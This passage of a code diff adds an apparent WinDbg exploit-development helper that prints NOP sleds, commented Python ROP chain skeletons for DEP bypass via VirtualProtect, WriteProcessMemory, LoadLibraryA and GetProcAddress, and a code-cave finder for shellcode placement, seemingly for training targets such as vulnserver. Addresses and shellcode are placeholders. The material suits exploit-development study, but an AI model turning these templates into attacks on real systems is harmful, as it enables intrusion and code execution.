+        const hexStr = sled.map((b) => b.toString(16).toUpperCase().padStart(2, "0")).join(" ");
+        const python = `b"${sled.map((b) => `\\x${b.toString(16).padStart(2, "0")}`).join("")}"`;
+        section("NOP Sled");
+        info(`Length: ${length} bytes  Byte: 0x${nopByte.toString(16).toUpperCase().padStart(2, "0")}`);
+        print(hexStr);
+        print(python);
+        whyItMatters("A NOP sled gives the exploit a landing zone \u2014 small ESP variations still slide into shellcode.");
+        return {
+          command: "nop",
+          args: options,
+          success: true,
+          findings: [{ length, byte: nopByte, sled }],
+          warnings: [],
+          errors: []
+        };
+      }
+    };
+  }
+
+  // src/commands/rop_template.ts
+  function vpTemplate(mod) {
+    section("VirtualProtect DEP Bypass \u2014 ROP Chain Skeleton");
+    print("Prototype: BOOL VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)");
+    print("Goal:      mark shellcode region PAGE_EXECUTE_READWRITE (flNewProtect = 0x40)");
+    section("Step 1 \u2014 find addresses");
+    print(`  VirtualProtect addr:   dx @$osed().sc.iat_find("VirtualProtect")`);
+    print(`  jmp esp (dispatch):    dx @$osed().find_bytes("${mod}", "FF E4")`);
+    print(`  pushad ; ret:          dx @$osed().find_bytes("${mod}", "60 C3")`);
+    print(`  Gadgets (pop/inc/neg): dx @$osed().rop_suggest("${mod}", 50, true, "fast", "semantic")`);
+    print(`  Stack adjustments:     dx @$osed().add_esp("${mod}")`);
+    print(`  Writable addr:         dx @$osed().modules()  -- pick a .data section address`);
+    section("Step 2 \u2014 PUSHAD technique register map");
+    print("  After PUSHAD ; RET, the stack looks like:");
+    print("    [ESP+0]  = EDI  <- consumed by RET (set to VirtualProtect address)");
+    print("    [ESP+4]  = ESI  <- return addr for VP's RETN 10h (set to jmp esp)");
+    print("    [ESP+8]  = EBP  <- lpAddress  (set to shellcode start)");
+    print("    [ESP+12] = saved_ESP <- dwSize (stack addr \u2014 rounds up, usually OK)");
+    print("    [ESP+16] = EBX  <- flNewProtect = 0x40");
+    print("    [ESP+20] = EDX  <- lpflOldProtect (writable dummy)");
+    print("    [ESP+24] = ECX  <- (unused by VirtualProtect)");
+    print("    [ESP+28] = EAX  <- (unused by VirtualProtect)");
+    section("Step 3 \u2014 Python skeleton");
+    print("import struct");
+    print("def p32(v): return struct.pack('<I', v)");
+    print("");
+    print("OFFSET   = ???           # bytes from buffer start to EIP control");
+    print('VP       = 0x????????    # VirtualProtect  dx @$osed().sc.iat_find("VirtualProtect")');
+    print(`JMP_ESP  = 0x????????    # jmp esp         dx @$osed().find_bytes("${mod}", "FF E4")`);
+    print("WRITABLE = 0x????????    # writable addr   dx @$osed().modules() -> .data section");
+    print("LP_ADDR  = 0x????????    # shellcode addr  compute from ESP (see step 4)");
+    print("");
+    print('rop_chain = b""');
+    print("");
+    print("# \u2500\u2500 Register setup (PUSHAD technique) \u2500\u2500");
+    print("rop_chain += p32(0x????????)  # pop edi ; ret");
+    print("rop_chain += p32(VP)          # EDI = VirtualProtect address");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop esi ; ret");
+    print("rop_chain += p32(JMP_ESP)     # ESI = jmp esp (return to shellcode after VP)");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop ebp ; ret");
+    print("rop_chain += p32(LP_ADDR)     # EBP = lpAddress (shellcode start, see step 4)");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop ebx ; ret");
+    print("rop_chain += p32(0x00000040)  # EBX = flNewProtect (PAGE_EXECUTE_READWRITE)");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop edx ; ret");
+    print("rop_chain += p32(WRITABLE)    # EDX = lpflOldProtect dummy");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop ecx ; ret  (ECX unused \u2014 any writable value)");
+    print("rop_chain += p32(WRITABLE)");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop eax ; ret  (EAX unused \u2014 put 0 or junk)");
+    print("rop_chain += p32(0x90909090)");
+    print("");
+    print("rop_chain += p32(0x????????)  # pushad ; ret");
+    print(`                               #   dx @$osed().find_bytes("${mod}", "60 C3")`);
+    print("");
+    print("# \u2500\u2500 NOP sled + shellcode \u2500\u2500");
+    print('nop_sled  = b"\\x90" * 16    # dx @$osed().nop(16)');
+    print('shellcode = nop_sled + b"\\xfc\\xe8..."  # your payload');
+    print('                               # dx @$osed().encode("FC E8 ...", "00 0A 0D")');
+    print("");
+    print('payload = b"A" * OFFSET + rop_chain + shellcode');
+    section("Step 4 \u2014 compute LP_ADDR (shellcode stack address)");
+    print("  The PUSHAD technique uses the saved ESP (stack addr before PUSHAD) as dwSize.");
+    print("  To find LP_ADDR (EBP = shellcode location on stack):");
+    print("  1. Run exploit with 'CC' shellcode; check EBP at VirtualProtect breakpoint.");
+    print("  2. Or: prepend gadgets to capture ESP and add the chain-to-shellcode offset:");
+    print("       dx @$osed().rop_suggest(...)  ->  push esp ; pop eax ; ret");
+    print("       dx @$osed().add_esp(...)      ->  add eax, N ; ret   (N = measured offset)");
+    print("     Then use a  mov [writable], eax ; ret  gadget and patch EBP from that addr.");
+  }
+  function wpmTemplate(mod) {
+    section("WriteProcessMemory DEP Bypass \u2014 ROP Chain Skeleton");
+    print("Prototype: BOOL WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpBytesWritten)");
+    print("Goal:      copy shellcode into a known-executable .text section, then jump to it.");
+    section("Find addresses");
+    print(`  WriteProcessMemory:  dx @$osed().sc.iat_find("WriteProcessMemory")`);
+    print(`  Writable addr:       dx @$osed().modules()  -- any .data section`);
+    print(`  Executable target:   dx @$osed().modules()  -- any .text section address`);
+    print(`  Gadgets:             dx @$osed().rop_suggest("${mod}", 50, true, "fast", "semantic")`);
+    section("Python skeleton");
+    print("import struct");
+    print("def p32(v): return struct.pack('<I', v)");
+    print("");
+    print("OFFSET      = ???          # EIP control offset");
+    print("WPM         = 0x????????   # WriteProcessMemory  dx @$osed().sc.iat_find(...)");
+    print("EXEC_TARGET = 0x????????   # executable .text address to write shellcode into");
+    print("WRITABLE    = 0x????????   # .data writable addr");
+    print("SC_SRC      = 0x????????   # shellcode source (stack addr \u2014 compute dynamically)");
+    print("");
+    print("# PUSHAD register map for WriteProcessMemory(hProcess, lpBase, lpBuf, nSize, lpWritten):");
+    print("#   EDI = WPM            ESI = return addr   EBP = hProcess (0xFFFFFFFF = current)");
+    print("#   EBX = lpBaseAddress  EDX = lpBuffer      ECX = nSize    EAX = lpBytesWritten");
+    print("");
+    print('rop_chain = b""');
+    print("rop_chain += p32(0x????????)  # pop edi ; ret");
+    print("rop_chain += p32(WPM)");
+    print("rop_chain += p32(0x????????)  # pop esi ; ret");
+    print("rop_chain += p32(0x????????)  # return addr after WPM (jmp to EXEC_TARGET)");
+    print("rop_chain += p32(0x????????)  # pop ebp ; ret");
+    print("rop_chain += p32(0xFFFFFFFF)  # hProcess = GetCurrentProcess()");
+    print("rop_chain += p32(0x????????)  # pop ebx ; ret");
+    print("rop_chain += p32(EXEC_TARGET) # lpBaseAddress");
+    print("rop_chain += p32(0x????????)  # pop edx ; ret");
+    print("rop_chain += p32(SC_SRC)      # lpBuffer (shellcode source on stack)");
+    print("rop_chain += p32(0x????????)  # pop ecx ; ret");
+    print("rop_chain += p32(0x00000201)  # nSize");
+    print("rop_chain += p32(0x????????)  # pop eax ; ret");
+    print("rop_chain += p32(WRITABLE)    # lpBytesWritten (dummy writable)");
+    print("rop_chain += p32(0x????????)  # pushad ; ret");
+    print("");
+    print('shellcode = b"\\x90" * 16 + b"\\xfc\\xe8..."');
+    print('payload   = b"A" * OFFSET + rop_chain + shellcode');
+  }
+  function llaTemplate(mod) {
+    section("LoadLibraryA \u2014 ROP Chain Skeleton");
+    print("Prototype: HMODULE LoadLibraryA(LPCSTR lpLibFileName)");
+    print("Goal:      load a DLL at runtime to resolve APIs not in the target's IAT.");
+    print("Returns:   HMODULE in EAX (pass to GetProcAddress).");
+    section("Step 1 \u2014 find addresses");
+    print(`  LoadLibraryA addr:     dx @$osed().sc.iat_find("LoadLibraryA")`);
+    print(`  Gadgets (pop/etc):     dx @$osed().rop_suggest("${mod}", 50, true, "fast", "semantic")`);
+    section("Step 2 \u2014 PUSHAD technique register map");
+    print("  After PUSHAD ; RET, the stack looks like:");
+    print("    [ESP+0]  = EDI  <- consumed by RET (set to LoadLibraryA address)");
+    print("    [ESP+4]  = ESI  <- return addr (next chain stage, e.g. GetProcAddress)");
+    print("    [ESP+8]  = EBP  <- lpLibFileName (pointer to DLL name string)");
+    print("    [ESP+12] = saved_ESP <- (unused by LoadLibraryA)");
+    print("    [ESP+16] = EBX  <- (unused)");
+    print("    [ESP+20] = EDX  <- (unused)");
+    print("    [ESP+24] = ECX  <- (unused)");
+    print("    [ESP+28] = EAX  <- (unused)");
+    section("Step 3 \u2014 Python skeleton");
+    print("import struct");
+    print("def p32(v): return struct.pack('<I', v)");
+    print("");
+    print("OFFSET       = ???           # bytes from buffer start to EIP control");
+    print('LLA          = 0x????????    # LoadLibraryA  dx @$osed().sc.iat_find("LoadLibraryA")');
+    print("NEXT_STAGE   = 0x????????    # return addr (e.g. GetProcAddress chain entry)");
+    print('DLL_NAME_PTR = 0x????????    # pointer to null-terminated DLL name (e.g. "ws2_32.dll")');
+    print("");
+    print('rop_chain = b""');
+    print("");
+    print("# \u2500\u2500 Register setup (PUSHAD technique) \u2500\u2500");
+    print("rop_chain += p32(0x????????)  # pop edi ; ret");
+    print("rop_chain += p32(LLA)         # EDI = LoadLibraryA address");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop esi ; ret");
+    print("rop_chain += p32(NEXT_STAGE)  # ESI = return addr (next stage)");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop ebp ; ret");
+    print("rop_chain += p32(DLL_NAME_PTR)# EBP = lpLibFileName");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop ebx ; ret  (EBX unused)");
+    print("rop_chain += p32(0x90909090)");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop edx ; ret  (EDX unused)");
+    print("rop_chain += p32(0x90909090)");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop ecx ; ret  (ECX unused)");
+    print("rop_chain += p32(0x90909090)");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop eax ; ret  (EAX unused)");
+    print("rop_chain += p32(0x90909090)");
+    print("");
+    print("rop_chain += p32(0x????????)  # pushad ; ret");
+    print(`                               #   dx @$osed().find_bytes("${mod}", "60 C3")`);
+    print("");
+    print("# LoadLibraryA returns HMODULE in EAX \u2014 chain NEXT_STAGE to");
+    print("# a GetProcAddress chain that consumes EAX as hModule.");
+    section("Step 4 \u2014 staging the DLL name string");
+    print('  The DLL name (e.g. "ws2_32.dll\\x00") must be null-terminated and');
+    print("  accessible at DLL_NAME_PTR when LoadLibraryA runs. Options:");
+    print("  1. Place it on the stack after the chain and compute its ESP-relative address.");
+    print("  2. Write it into a writable .data section via WriteProcessMemory or mov [reg],val gadgets.");
+    print("  3. Find it already in memory (e.g. a string table in the target binary).");
+  }
+  function gpaTemplate(mod) {
+    section("GetProcAddress \u2014 ROP Chain Skeleton");
+    print("Prototype: FARPROC GetProcAddress(HMODULE hModule, LPCSTR lpProcName)");
+    print("Goal:      resolve a function address from a loaded DLL at runtime.");
+    print("Returns:   FARPROC (function pointer) in EAX.");
+    section("Step 1 \u2014 find addresses");
+    print(`  GetProcAddress addr:   dx @$osed().sc.iat_find("GetProcAddress")`);
+    print(`  Gadgets (pop/etc):     dx @$osed().rop_suggest("${mod}", 50, true, "fast", "semantic")`);
+    section("Step 2 \u2014 PUSHAD technique register map");
+    print("  After PUSHAD ; RET, the stack looks like:");
+    print("    [ESP+0]  = EDI  <- consumed by RET (set to GetProcAddress address)");
+    print("    [ESP+4]  = ESI  <- return addr (next chain stage, e.g. call eax)");
+    print("    [ESP+8]  = EBP  <- hModule (from LoadLibraryA return value in EAX)");
+    print("    [ESP+12] = saved_ESP <- lpProcName (not directly settable)");
+    print("    [ESP+16] = EBX  <- (lpProcName alternative \u2014 see constraints)");
+    print("    [ESP+20] = EDX  <- (unused)");
+    print("    [ESP+24] = ECX  <- (unused)");
+    print("    [ESP+28] = EAX  <- (unused)");
+    section("Step 3 \u2014 Python skeleton");
+    print("import struct");
+    print("def p32(v): return struct.pack('<I', v)");
+    print("");
+    print("OFFSET        = ???           # bytes from buffer start to EIP control");
+    print('GPA           = 0x????????    # GetProcAddress  dx @$osed().sc.iat_find("GetProcAddress")');
+    print("NEXT_STAGE    = 0x????????    # return addr (e.g. jmp eax / call eax to run resolved func)");
+    print("HMODULE       = 0x????????    # hModule from LoadLibraryA (or known module base)");
+    print("FUNC_NAME_PTR = 0x????????    # pointer to null-terminated function name string");
+    print("");
+    print('rop_chain = b""');
+    print("");
+    print("# \u2500\u2500 Register setup (PUSHAD technique) \u2500\u2500");
+    print("rop_chain += p32(0x????????)  # pop edi ; ret");
+    print("rop_chain += p32(GPA)         # EDI = GetProcAddress address");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop esi ; ret");
+    print("rop_chain += p32(NEXT_STAGE)  # ESI = return addr");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop ebp ; ret");
+    print("rop_chain += p32(HMODULE)     # EBP = hModule");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop ebx ; ret");
+    print("rop_chain += p32(FUNC_NAME_PTR)# EBX = lpProcName");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop edx ; ret  (EDX unused)");
+    print("rop_chain += p32(0x90909090)");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop ecx ; ret  (ECX unused)");
+    print("rop_chain += p32(0x90909090)");
+    print("");
+    print("rop_chain += p32(0x????????)  # pop eax ; ret  (EAX unused)");
+    print("rop_chain += p32(0x90909090)");
+    print("");
+    print("rop_chain += p32(0x????????)  # pushad ; ret");
+    print(`                               #   dx @$osed().find_bytes("${mod}", "60 C3")`);
+    print("");
+    print("# GetProcAddress returns FARPROC in EAX \u2014 dispatch via jmp eax or call eax.");
+    section("Constraints");
+    print("  PUSHAD places saved ESP as the 2nd argument (lpProcName). Since saved ESP");
+    print("  is not directly settable, the PUSHAD technique only works if:");
+    print("  1. You use a flat stdcall frame (no PUSHAD) and place hModule/lpProcName directly.");
+    print("  2. Or you stage lpProcName at a known address and accept saved ESP as junk,");
+    print("     rearranging the register map to put lpProcName in EBX (requires a different");
+    print("     dispatch shape or a RET-slide variant).");
+    print("  3. Or chain from LoadLibraryA where EAX already holds hModule and use gadgets");
+    print("     to marshal arguments directly.");
+    print("");
+    print("  For chained LoadLibraryA -> GetProcAddress resolution, a flat stdcall frame");
+    print("  or IAT slot_call dispatch is usually simpler than PUSHAD.");
+  }
+  function createRopTemplateCommand() {
+    return {
+      name: "rop_template",
+      description: "Print a commented ROP chain skeleton for a supported API.",
+      usage: "dx @$osed().rop_template(api?, module?)",
+      examples: [
+        'dx @$osed().rop_template("VirtualProtect", "essfunc")',
+        'dx @$osed().rop_template("WriteProcessMemory", "essfunc")',
+        'dx @$osed().rop_template("LoadLibraryA", "essfunc")',
+        'dx @$osed().rop_template("GetProcAddress", "essfunc")'
+      ],
+      schema: {
+        api: { type: "string", enum: ["VirtualProtect", "WriteProcessMemory", "LoadLibraryA", "GetProcAddress"], default: "VirtualProtect" },
+        module: { type: "string", default: "TARGET_MODULE" }
+      },
+      execute(options) {
+        var _a, _b;
+        const api = (_a = options.api) != null ? _a : "VirtualProtect";
+        const mod = (_b = options.module) != null ? _b : "TARGET_MODULE";
+        switch (api) {
+          case "WriteProcessMemory":
+            wpmTemplate(mod);
+            break;
+          case "LoadLibraryA":
+            llaTemplate(mod);
+            break;
+          case "GetProcAddress":
+            gpaTemplate(mod);
+            break;
+          default:
+            vpTemplate(mod);
+            break;
+        }
+        return {
+          command: "rop_template",
+          args: options,
+          success: true,
+          findings: [{ api, module: mod }],
+          warnings: [],
+          errors: []
+        };
+      }
+    };
+  }
+
+  // src/commands/code_caves.ts
+  var IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE2 = 64;
+  var ROP_WORKSPACE_MIN_BYTES = 128;
+  function classifyRun(nullCount, int3Count, nopCount) {
+    const total = nullCount + int3Count + nopCount;
+    if (total === nullCount)
+      return "NULL";
+    if (total === int3Count)
+      return "INT3";
+    if (total === nopCount)
+      return "NOP";
+    return "PADDING";
+  }
+  function isCaveByte(byte) {
+    return byte === 0 || byte === 204 || byte === 144;
+  }
+  function alignUp(value, alignment) {
+    if (alignment <= 0)
+      return value;
+    return Math.ceil(value / alignment) * alignment;
+  }
+  function readSectionAlignment(moduleBase) {
+    try {
+      const mz = readUint16LE(moduleBase);
+      if (mz !== 23117)
+        return 0;
+      const peOffset = readUint32LE(moduleBase + __bi(60));
+      const pe = moduleBase + __bi(peOffset);
+      if (readUint32LE(pe) !== 17744)
+        return 0;
+      return readUint32LE(pe + __bi(56));
+    } catch (e) {
+      return 0;
+    }
+  }
+  function readModuleAslr(moduleBase) {
+    try {
+      const mz = readUint16LE(moduleBase);
+      if (mz !== 23117)
+        return "unknown";
+      const peOffset = readUint32LE(moduleBase + __bi(60));
+      const pe = moduleBase + __bi(peOffset);
+      if (readUint32LE(pe) !== 17744)
+        return "unknown";
+      const dllChars = readUint16LE(pe + __bi(94));
+      return (dllChars & IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE2) !== 0 ? "enabled" : "disabled";
+    } catch (e) {
+      return "unknown";
+    }
+  }
+  function computeEffectiveSizes(sections) {
+    var _a;
+    if (sections.length === 0)
+      return [];
+    const grouped = /* @__PURE__ */ new Map();
+    for (const section2 of sections) {
+      const key2 = `${section2.module.base.toString(16)}`;
+      const list = (_a = grouped.get(key2)) != null ? _a : [];
+      list.push(section2);
+      grouped.set(key2, list);
+    }
+    const effectiveSizes = new Array(sections.length);
+    for (const moduleSections of grouped.values()) {
+      const moduleBase = moduleSections[0].module.base;
+      const moduleEnd = moduleBase + moduleSections[0].module.size;
+      const sectionAlignment = readSectionAlignment(moduleBase);
+      const sorted = [...moduleSections].sort((a, b) => a.start < b.start ? -1 : 1);
+      for (let i = 0; i < sorted.length; i++) {
+        const section2 = sorted[i];
+        const idx = sections.indexOf(section2);
+        if (sectionAlignment > 0) {
+          const alignedSize = alignUp(section2.size, sectionAlignment);
+          const nextStart = i + 1 < sorted.length ? sorted[i + 1].start : moduleEnd;
+          const maxSize = Number(nextStart - section2.start);
+          effectiveSizes[idx] = Math.min(alignedSize, maxSize > 0 ? maxSize : alignedSize);
+        } else {
+          effectiveSizes[idx] = section2.size;
+        }
+      }
+    }
+    return effectiveSizes;
+  }
+  function scanForCaves(section2, scanSize, minSize, chunkSize) {
+    const caves = [];
+    let runStart;
+    let runLength = 0;
+    let nullCount = 0;
+    let int3Count = 0;
+    let nopCount = 0;
+    const moduleName = section2.module.name.replace(/^.*[\\\/]/, "");
+    const flush = () => {
+      if (runStart !== void 0 && runLength >= minSize) {
+        caves.push({
+          address: runStart,
+          size: runLength,
+          pattern: classifyRun(nullCount, int3Count, nopCount),
+          module: moduleName,
+          modulePath: section2.module.path,
+          moduleBase: section2.module.base,
+          section: section2.name,
+          sectionExecutable: section2.executable,
+          rva: Number(runStart - section2.module.base),
+          aslr: "unknown",
+          readable: null,
+          writable: null,
+          executable: null,
+          capabilities: [],
+          addrSafe: null,
+          badBytes: [],
+          safeOffset: null,
+          safeVa: null
+        });
+      }
+      runStart = void 0;
+      runLength = 0;
+      nullCount = 0;
+      int3Count = 0;
+      nopCount = 0;
+    };
+    for (let offset = 0; offset < scanSize; offset += chunkSize) {
+      const chunkStart = section2.start + __bi(offset);
+      const remaining = scanSize - offset;
+      const size = Math.min(remaining, chunkSize);
+      const bytes = tryReadMemory(chunkStart, size);
+      if (!bytes) {
+        flush();
+        continue;
+      }
+      for (let i = 0; i < bytes.length; i++) {
+        if (isCaveByte(bytes[i])) {
+          if (runStart === void 0) {
+            runStart = chunkStart + __bi(i);
+          }
+          runLength++;
+          if (bytes[i] === 0)
+            nullCount++;
+          else if (bytes[i] === 204)
+            int3Count++;
+          else
+            nopCount++;
+        } else {
+          flush();
+        }
+      }
+    }
+    flush();
+    return caves;
+  }
+  function classifyCapabilities(readable, writable, executable, size) {
+    const r = readable === true;
+    const w = writable === true;
+    const x = executable === true;
+    if (!r && !w && !x)
+      return ["UNUSABLE"];
+    const caps = [];
+    if (r && w && x)
+      caps.push("RWX");
+    if (x && !(r && w && x))
+      caps.push("EXEC");
+    if (w) {
+      caps.push("STAGING");
+      if (size >= ROP_WORKSPACE_MIN_BYTES)
+        caps.push("ROP_WORKSPACE");
+    }
+    if (r && !w && !x)
+      caps.push("READ_ONLY");
+    return caps.length > 0 ? caps : ["UNUSABLE"];
+  }
+  function displayCapabilities(caps) {
+    if (caps.includes("RWX"))
+      return "RWX";
+    if (caps.includes("UNUSABLE"))
+      return "UNUSABLE";
+    if (caps.includes("READ_ONLY"))
+      return "READ_ONLY";
+    const parts = [];
+    if (caps.includes("EXEC"))
+      parts.push("EXEC");
+    if (caps.includes("STAGING"))
+      parts.push("STAGING");
+    if (caps.includes("ROP_WORKSPACE"))
+      parts.push("ROP");
+    return parts.join(",");
+  }
+  function protectionLabel(r, w, x) {
+    if (r === null && w === null && x === null)
+      return "?";
+    const parts = [];
+    if (r)
+      parts.push("R");
+    if (w)
+      parts.push("W");
+    if (x)
+      parts.push("X");
+    return parts.length > 0 ? parts.join("") : "-";
+  }
+  function enrichAndSplit(caves, minSize) {
+    const result3 = [];
+    for (const cave of caves) {
+      let pos = cave.address;
+      const end = cave.address + __bi(cave.size);
+      while (pos < end) {
+        const region = memoryRegion(pos);
+        let segEnd;
+        if (region.baseAddress !== void 0 && region.regionSize !== void 0 && region.regionSize > __bi(0) && region.baseAddress <= pos && region.baseAddress + region.regionSize > pos) {
+          segEnd = region.baseAddress + region.regionSize;
+          if (segEnd > end)
+            segEnd = end;
+        } else {
+          segEnd = end;
+        }
+        const segSize = Number(segEnd - pos);
+        if (segSize >= minSize) {
+          let r = region.readable;
+          let w = region.writable;
+          let x = region.executable;
+          if (region.guarded === true || region.noAccess === true || region.committed !== null && !region.committed) {
+            r = false;
+            w = false;
+            x = false;
+          }
+          const offsetFromOriginal = Number(pos - cave.address);
+          result3.push(__spreadProps(__spreadValues({}, cave), {
+            address: pos,
+            size: segSize,
+            rva: cave.rva + offsetFromOriginal,
+            readable: r,
+            writable: w,
+            executable: x,
+            capabilities: classifyCapabilities(r, w, x, segSize)
+          }));
+        }
+        pos = segEnd;
+      }
+    }
+    return result3;
+  }
+  function parseBadChars(input) {
+    const chars = /* @__PURE__ */ new Set();
+    const tokens = input.trim().split(/[\s,]+/);
+    for (const token of tokens) {
+      if (token.length === 0)
+        continue;
+      const value = parseInt(token, 16);
+      if (!isNaN(value) && value >= 0 && value <= 255) {
+        chars.add(value);
+      }
+    }
+    return chars;
+  }
+  function addressBadBytes(address, pointerSize, badChars) {
+    const bad = [];
+    let addr = address;
+    for (let i = 0; i < pointerSize; i++) {
+      const byte = Number(__bi.and(addr, __bi(255)));
+      if (badChars.has(byte))
+        bad.push(byte);
+      addr = __bi.shr(addr, __bi(8));
+    }
+    return [...new Set(bad)];
+  }
+  function findSafeOffset(caveAddress, caveSize, pointerSize, badChars) {
+    for (let delta = 0; delta < caveSize; delta++) {
+      const addr = caveAddress + __bi(delta);
+      if (addressBadBytes(addr, pointerSize, badChars).length === 0) {
+        return { offset: delta, va: addr };
+      }
+    }
+    return null;
+  }
+  function rankCaves(caves) {
+    return [...caves].sort((a, b) => {
+      const aslrRank = (c) => c.aslr === "disabled" ? 0 : c.aslr === "unknown" ? 1 : 2;
+      const aslrDiff = aslrRank(a) - aslrRank(b);
+      if (aslrDiff !== 0)
+        return aslrDiff;
+      if (a.addrSafe !== null && b.addrSafe !== null) {
+        const safeDiff = (a.addrSafe ? 0 : 1) - (b.addrSafe ? 0 : 1);
+        if (safeDiff !== 0)
+          return safeDiff;
+      }
+      const usability = (c) => {
+        if (c.capabilities.includes("UNUSABLE"))
+          return 2;
+        if (c.capabilities.includes("READ_ONLY"))
+          return 1;
+        return 0;
+      };
+      const useDiff = usability(a) - usability(b);
+      if (useDiff !== 0)
+        return useDiff;
+      return b.size - a.size;
+    });
+  }
+  function findCodeCaves(module, minSize, maxResults, badChars, capability2) {
+    const scope = forEachSection({
+      module,
+      executableOnly: false,
+      maxResults: 200,
+      chunkSize: 4096
+    });
+    const effectiveSizes = computeEffectiveSizes(scope.sections);
+    let pointerSize;
+    try {
+      pointerSize = getPointerSize();
+    } catch (e) {
+      pointerSize = 4;
+    }
+    const rawCaves = [];
+    for (let s = 0; s < scope.sections.length; s++) {
+      const section2 = scope.sections[s];
+      const scanSize = effectiveSizes[s];
+      const found = scanForCaves(section2, scanSize, minSize, 4096);
+      for (const cave of found) {
+        rawCaves.push(cave);
+      }
+    }
+    let caves = enrichAndSplit(rawCaves, minSize);
+    const aslrCache = /* @__PURE__ */ new Map();
+    for (const cave of caves) {
+      const key2 = cave.moduleBase.toString(16);
+      let aslr = aslrCache.get(key2);
+      if (aslr === void 0) {
+        aslr = readModuleAslr(cave.moduleBase);
+        aslrCache.set(key2, aslr);
+      }
+      cave.aslr = aslr;
+    }
+    if (capability2) {
+      const cap = capability2.toUpperCase();
+      caves = caves.filter((c) => c.capabilities.includes(cap));
+    }
+    if (badChars && badChars.trim().length > 0) {
+      const badSet = parseBadChars(badChars);
+      if (badSet.size > 0) {
+        for (const cave of caves) {
+          const bad = addressBadBytes(cave.address, pointerSize, badSet);
+          cave.addrSafe = bad.length === 0;
+          cave.badBytes = bad;
+          if (!cave.addrSafe) {
+            const safe = findSafeOffset(cave.address, cave.size, pointerSize, badSet);
+            if (safe) {
+              cave.safeOffset = safe.offset;
+              cave.safeVa = safe.va;
+            }
+          }
+        }
+      }
+    }
+    caves = rankCaves(caves);
+    caves = caves.slice(0, maxResults);
+    return { caves, warnings: scope.warnings };
+  }
+  function createCodeCavesCommand() {
+    return {
+      name: "code_caves",
+      description: "Find contiguous null/int3/nop padding regions in PE sections suitable for shellcode placement. Inspired by nop-tech/codecaver (https://github.com/nop-tech/codecaver).",
+      usage: "dx @$osed().code_caves(module?, minSize?, maxResults?, badChars?, capability?)",
+      examples: [
+        "dx @$osed().code_caves()",
+        'dx @$osed().code_caves("vulnserver")',
+        'dx @$osed().code_caves("essfunc", 100)',
+        'dx @$osed().code_caves("essfunc", 50, 25, "00 0A 0D")',
+        'dx @$osed().code_caves("", 50, 25, "", "EXEC")'
+      ],
+      schema: {
+        module: { type: "string" },
+        minSize: { type: "number", min: 1, default: 50 },
+        maxResults: { type: "number", min: 1, max: 100, default: 25 },
+        badChars: { type: "string" },
+        capability: { type: "string" }
+      },
+      execute(options) {
+        var _a, _b;
+        const module = options.module;
+        const minSize = (_a = options.minSize) != null ? _a : 50;
+        const maxResults = (_b = options.maxResults) != null ? _b : 25;
+        const badChars = options.badChars;
+        const capability2 = options.capability;
+        const pointerSize = getPointerSize();
+        const hasBadChars = badChars !== void 0 && badChars.trim().length > 0;
+        const { caves, warnings } = findCodeCaves(module, minSize, maxResults, badChars, capability2);
+        section("Code Caves");
+        if (caves.length === 0) {
+          const parts = [`No caves >= ${minSize} bytes found`];
+          if (module)
+            parts.push(`in '${module}'`);
+          if (capability2)
+            parts.push(`with capability ${capability2}`);
+          info(parts.join(" ") + ".");
+        } else {
+          const parts = [`Found ${caves.length} cave(s)`, `min ${minSize} bytes`];
+          if (module)
+            parts.push(`module: ${module}`);
+          if (capability2)
+            parts.push(`filter: ${capability2}`);
+          if (hasBadChars)
+            parts.push("bad chars applied");
+          info(parts.join(", "));
+          const columns = [
+            { key: "va", header: "VA", width: pointerSize * 2 + 2 },
+            { key: "rva", header: "RVA", width: pointerSize * 2 + 2 },
+            { key: "size", header: "Size", width: 11 },
+            { key: "pattern", header: "Pattern", width: 7 },
+            { key: "module", header: "Module", width: 16 },
+            { key: "section", header: "Section", width: 8 },
+            { key: "aslr", header: "ASLR" },
+            { key: "prot", header: "Prot" },
+            { key: "capability", header: "Capability", width: 14 }
+          ];
+          if (hasBadChars) {
+            columns.push({ key: "addrSafe", header: "AddrSafe" });
+            columns.push({ key: "safeVa", header: "SafeVA", width: pointerSize * 2 + 2 });
+          }
+          table(columns, caves.map((cave) => {
+            const row = {
+              va: formatAddress(cave.address, pointerSize),
+              rva: formatAddress(__bi(cave.rva), pointerSize),
+              size: `0x${cave.size.toString(16).toUpperCase()} (${cave.size})`,
+              pattern: cave.pattern,
+              module: cave.module,
+              section: cave.section,
+              aslr: cave.aslr === "enabled" ? "yes" : cave.aslr === "disabled" ? "no" : "?",
+              prot: protectionLabel(cave.readable, cave.writable, cave.executable),
+              capability: displayCapabilities(cave.capabilities)
+            };
+            if (hasBadChars) {
+              row.addrSafe = cave.addrSafe ? "yes" : "no";
+              row.safeVa = cave.addrSafe ? "-" : cave.safeVa !== null ? formatAddress(cave.safeVa, pointerSize) : "(none)";
+            }
+            return row;
+          }));
+          if (hasBadChars) {
+            const unsafeCount = caves.filter((c) => c.addrSafe === false).length;
+            if (unsafeCount > 0) {
+              const aslrNote = caves.some((c) => c.aslr === "enabled") ? " (ASLR addresses valid for current mapping only)" : "";
+              info(`${unsafeCount} cave address(es) contain forbidden bytes${aslrNote}.`);
+            }
+          }
+        }
+        for (const warning of warnings) {
+          warn(warning);
+        }
+        whyItMatters("Code caves are unused regions within mapped images. Their suitability for execution, staging, or ROP workspaces depends on memory protection, address stability, and input constraints.");
+        return {
+          command: "code_caves",
+          args: options,
+          success: true,
+          findings: caves.map((cave) => ({
+            address: formatAddress(cave.address, pointerSize),
+            rva: cave.rva,
+            size: cave.size,
